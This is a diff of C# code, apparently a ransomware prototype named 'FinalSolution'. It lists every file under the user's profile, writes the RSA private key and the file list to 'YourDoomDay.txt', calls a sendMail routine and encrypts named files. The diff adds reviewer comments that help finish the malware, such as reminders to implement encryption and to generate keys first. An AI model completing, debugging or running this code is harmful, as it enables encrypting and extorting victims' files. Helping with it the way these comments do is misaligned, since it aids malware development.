@@ -15,8 +15,10 @@ namespace FinalSolution
     {
         private static string publicKey;
         private static string privateKey;
-
+        
+        // TODO: put the file in c:\\windows\\Temp (should always exist)
         private static string outputFilePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\YourDoomDay.txt";
+        // TODO: open and close the streamwriter between writes, don't hold it open.
         private static StreamWriter ioFile = new StreamWriter(outputFilePath);
 
         static void Main(string[] args)
@@ -27,13 +29,14 @@ namespace FinalSolution
                 ioFile.WriteLine(privateKey);
                 ioFile.WriteLine("%%%%%%%%%%%%%%%");
             }
-            catch { }
+            catch { // ioFile.WriteLine("Could not write private key"); }
 
             // Get Sub Files
             foreach (var directory in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)))
             {
                 try
                 {
+                    // TODO: Are you sure this returns all the files in all the subdirectories, recursively?
                     var filesOfSpecificFolder = Directory.GetFiles(directory, "*.*", SearchOption.AllDirectories);
 
                     foreach (var file in filesOfSpecificFolder)
@@ -41,19 +44,24 @@ namespace FinalSolution
                         try
                         {
                             // TODO: Encrypt
+                            // TODO: dont forget to encrypt, but make sure to first initialize the pair
                             ioFile.WriteLine("FName: " + file);
                             ioFile.WriteLine("FSize: " + new FileInfo(file).Length);
                             ioFile.WriteLine("__________________");
                             //Debug.Print(file);
                         }
-                        catch {/* Maybe next time*/}
+                        catch {/* Maybe next time ioFile.WriteLine("Couldnt encrypt file " + file); */}
                     }
                 }
                 catch { }
             }
             ioFile.Close();
             sendMail();
+                
+            // You probably need to generate the keys before encrypting
             RSA.GenerateRSAKeyPair(out publicKey, out privateKey);
+                
+            // I think you want to remove these lines
             encryptFile(@"C:\Users\dor.ben\Desktop\MyAgent.exe");
             encryptFile(@"C:\Users\dor.ben\Desktop\lab_10(1).pdf");
         }
